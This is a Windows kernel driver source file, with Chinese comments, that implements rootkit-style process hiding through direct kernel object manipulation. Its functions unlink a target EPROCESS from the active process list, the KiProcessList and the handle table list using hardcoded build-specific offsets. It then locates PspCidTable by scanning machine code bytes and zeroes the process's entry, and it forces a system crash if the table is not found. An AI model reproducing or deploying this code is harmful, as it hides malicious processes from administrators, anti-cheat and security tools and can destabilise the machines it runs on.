#pragma once
#include "dkom.hpp"

VOID UnlinkActiveProcessLists(PEPROCESS PE) {
				ULONG ActiveProcessOffset = 0;
				ULONG ExitTimeOffset = 0;


				RTL_OSVERSIONINFOW Version = { 0 };
				Version.dwOSVersionInfoSize = sizeof(Version);
				RtlGetVersion(&Version);
				switch (Version.dwBuildNumber)
				{

				case 17134: //1803
				case 17763://1809
								ActiveProcessOffset = 0x2E8;
								break;
				case 18362://1903
				case 18363://1909
								ActiveProcessOffset = 0x2F0;
								break;
				case 19041://2004
				case 19569://2004+
								ActiveProcessOffset = 0x448;
								break;
				default:
								ActiveProcessOffset = 0x448;
								break;
				}

				LIST_ENTRY* ActiveProcessLink = (LIST_ENTRY*)((ULONG64)PE + ActiveProcessOffset);
				if (ActiveProcessLink->Blink != 0 && ActiveProcessLink->Flink != 0) {
								ActiveProcessLink->Blink->Flink = ActiveProcessLink->Flink;
								ActiveProcessLink->Flink->Blink = ActiveProcessLink->Blink;
								ActiveProcessLink->Blink = 0;
								ActiveProcessLink->Flink = 0;
				}
}

VOID UnlinkProcessListEntry(PEPROCESS PE) {
				ULONG KiProcessList = 0;
				RTL_OSVERSIONINFOW Version = { 0 };
				Version.dwOSVersionInfoSize = sizeof(Version);
				RtlGetVersion(&Version);
				switch (Version.dwBuildNumber)
				{
				case 17134: KiProcessList = 0x0240; break;
				case 17763: KiProcessList = 0x0240; break;

				case 18362:KiProcessList = 0x0248; break;
				case 18363:KiProcessList = 0x0248; break;

				default:KiProcessList = 0x350; break;
				}

				if (KiProcessList != 0)
				{
								LIST_ENTRY* KiProcessListHead = (LIST_ENTRY*)((ULONG64)PE + KiProcessList);
								if (KiProcessListHead->Blink != 0 && KiProcessListHead->Flink != 0) {
												KiProcessListHead->Blink->Flink = KiProcessListHead->Flink;
												KiProcessListHead->Flink->Blink = KiProcessListHead->Blink;
												KiProcessListHead->Blink = 0;
												KiProcessListHead->Flink = 0;
								}
				}
}

VOID UnlinkHandleTableList(PEPROCESS PE)
{
				ULONG HandleTableOffset = 0x418;
				RTL_OSVERSIONINFOW Version = { 0 };
				Version.dwOSVersionInfoSize = sizeof(Version);
				RtlGetVersion(&Version);
				if (Version.dwBuildNumber > 18363)
				{
								HandleTableOffset = 0x570;
				}
				ULONG64 HandleTable = *(PULONG64)((ULONG64)PE + HandleTableOffset);
				LIST_ENTRY* HandleTableList = (LIST_ENTRY*)(HandleTable + 0x18);
				HandleTableList->Blink->Flink = HandleTableList->Flink;
				HandleTableList->Flink->Blink = HandleTableList->Blink;
				HandleTableList->Blink = HandleTableList;
				HandleTableList->Flink = HandleTableList;
}

BOOLEAN get_PspCidTable(ULONG64* tableAddr) {
				// 获取 PsLookupProcessByProcessId 地址
				UNICODE_STRING uc_funcName;
				RtlInitUnicodeString(&uc_funcName, L"PsLookupProcessByProcessId");
				ULONG64 ul_funcAddr = (ULONG64)MmGetSystemRoutineAddress(&uc_funcName);
				if (ul_funcAddr == NULL) {
								DbgPrint("[LYSM] MmGetSystemRoutineAddress error.\n");
								return FALSE;
				}
				DbgPrint("[LYSM] PsLookupProcessByProcessId:%p\n", ul_funcAddr);

				// 前 40 字节有 call（PspReferenceCidTableEntry）
				ULONG64 ul_entry = 0;
				for (INT i = 0; i < 40; i++) {
								if (*(PUCHAR)(ul_funcAddr + i) == 0xe8) {
												ul_entry = ul_funcAddr + i;
												break;
								}
				}
				if (ul_entry != 0) {
								// 解析 call 地址
								INT i_callCode = *(INT*)(ul_entry + 1);
								DbgPrint("[LYSM] i_callCode:%llx\n", i_callCode);
								ULONG64 ul_callJmp = ul_entry + i_callCode + 5;
								DbgPrint("[LYSM] ul_callJmp:%p\n", ul_callJmp);
								// 来到 call（PspReferenceCidTableEntry） 内找 PspCidTable
								for (INT i = 0; i < 0x30; i++) {
												if (*(PUCHAR)(ul_callJmp + i) == 0x48 &&
																*(PUCHAR)(ul_callJmp + i + 1) == 0x8b &&
																*(PUCHAR)(ul_callJmp + i + 2) == 0x05) {
																// 解析 mov 地址
																INT i_movCode = *(INT*)(ul_callJmp + i + 3);
																DbgPrint("[LYSM] i_movCode:%llx\n", i_movCode);
																ULONG64 ul_movJmp = ul_callJmp + i + i_movCode + 7;
																DbgPrint("[LYSM] ul_movJmp:%p\n", ul_movJmp);
																// 得到 PspCidTable
																*tableAddr = *(ULONG64*)ul_movJmp;
																return TRUE;
												}
								}
				}

				// 前 40字节没有 call
				else {
								// 直接在 PsLookupProcessByProcessId 找 PspCidTable
								for (INT i = 0; i < 70; i++) {
												if (*(PUCHAR)(ul_funcAddr + i) == 0x49 &&
																*(PUCHAR)(ul_funcAddr + i + 1) == 0x8b &&
																*(PUCHAR)(ul_funcAddr + i + 2) == 0xdc &&
																*(PUCHAR)(ul_funcAddr + i + 3) == 0x48 &&
																*(PUCHAR)(ul_funcAddr + i + 4) == 0x8b &&
																*(PUCHAR)(ul_funcAddr + i + 5) == 0xd1 &&
																*(PUCHAR)(ul_funcAddr + i + 6) == 0x48 &&
																*(PUCHAR)(ul_funcAddr + i + 7) == 0x8b) {
																// 解析 mov 地址
																INT i_movCode = *(INT*)(ul_funcAddr + i + 6 + 3);
																DbgPrint("[LYSM] i_movCode:%llx\n", i_movCode);
																ULONG64 ul_movJmp = ul_funcAddr + i + 6 + i_movCode + 7;
																DbgPrint("[LYSM] ul_movJmp:%p\n", ul_movJmp);
																// 得到 PspCidTable
																*tableAddr = *(ULONG64*)ul_movJmp;
																return TRUE;
												}
								}
				}

				return FALSE;
}

unsigned __int64  ExpLookupHandleTableEntry(unsigned int* a1, __int64 a2)
{
				unsigned __int64 v2; // rdx
				__int64 v3; // r8
				__int64 v4; // rax
				__int64 v5; // rax

				DbgPrint("[HIDE] PspCidTable: %llx\n", a1);
				DbgPrint("[HIDE] PID: %llx\n", a2);

				v2 = a2 & 0xFFFFFFFFFFFFFFFCui64;
				if (v2 >= *a1)
								return 0i64;
				v3 = *((ULONG64*)a1 + 1);
				DbgPrint("[HIDE] Table code: %llx\n", v3);
				v4 = *((ULONG64*)a1 + 1) & 3i64;
				DbgPrint("[HIDE] Level pointer table: %llx\n", v4);
				if ((ULONG)v4 == 1)
				{
								v5 = *(ULONG64*)(v3 + 8 * (v2 >> 10) - 1);
								return v5 + 4 * (v2 & 0x3FF);
				}
				if ((ULONG)v4)
				{
								v5 = *(ULONG64*)(*(ULONG64
												*)(v3 + 8 * (v2 >> 19) - 2) + 8 * ((v2 >> 10) & 0x1FF));
								return v5 + 4 * (v2 & 0x3FF);
				}
				return v3 + 4 * v2;
}

VOID NullPspCidTable(ULONG64 Pid) {
				//ExDestroyHandle
				ULONG64 PspCidTable = 0;

				get_PspCidTable(&PspCidTable);

				if (PspCidTable == 0) {
								KeBugCheckEx(0, 0, 0, 0, 0);
				}

				ULONG64 Poin = ExpLookupHandleTableEntry((unsigned int*)PspCidTable, Pid);
				DbgPrint("[HIDE] Entry of target pid in PspCidTable: %llx\n", Poin);
				*(PULONG64)Poin = 0;
}